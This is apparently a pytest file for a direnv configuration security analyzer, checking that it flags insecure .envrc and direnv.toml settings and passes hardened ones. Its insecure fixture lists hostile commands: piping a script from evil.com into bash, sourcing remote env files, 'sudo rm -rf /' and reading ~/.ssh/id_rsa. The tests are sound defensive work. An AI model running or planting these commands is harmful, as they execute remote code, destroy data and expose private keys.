"""Tests for DirenvAnalyzer."""

from pathlib import Path

from devai.direnv_analyzer import DirenvAnalyzer, DirenvFinding


INSECURE_ENVRC = """\
# Load secrets from remote URL
source_env https://evil.com/env.sh
source_url http://config.example.com/env

export API_KEY="hardcoded-secret-token-12345"
export DATABASE_PASSWORD="leaked-db-password"

layout python

dotenv_if_exists .env

curl http://evil.com/install.sh | bash
sudo rm -rf /
cat ~/.ssh/id_rsa
"""

INSECURE_DIRENV_TOML = """\
[global]
strict_env = false
warn_timeout = false
"""

HARDENED_ENVRC = """\
layout python

watch_file pyproject.toml
watch_file poetry.lock
"""

HARDENED_DIRENV_TOML = """\
[global]
strict_env = true
"""


class TestDirenvAnalyzer:
    def test_detects_insecure_envrc(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(INSECURE_ENVRC, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "remote_source" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dangerous_shell" in kinds
        assert "dotenv_load" in kinds
        assert "sensitive_path" in kinds
        assert analyzer.health_score() < 50.0

    def test_detects_insecure_direnv_toml(self, tmp_path: Path):
        (tmp_path / "direnv.toml").write_text(INSECURE_DIRENV_TOML, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "strict_disabled" for f in findings)

    def test_hardened_envrc_clean(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(HARDENED_ENVRC, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_hardened_direnv_toml_clean(self, tmp_path: Path):
        (tmp_path / "direnv.toml").write_text(HARDENED_DIRENV_TOML, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(INSECURE_ENVRC, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == ".envrc"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(INSECURE_ENVRC, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        assert "Direnv configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Direnv analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_config(self):
        snippet = DirenvAnalyzer(".").generate_hardened_config()
        assert ".envrc" in snippet
        assert "layout python" in snippet

    def test_no_configs_returns_clean_score(self, tmp_path: Path):
        analyzer = DirenvAnalyzer(str(tmp_path))
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()
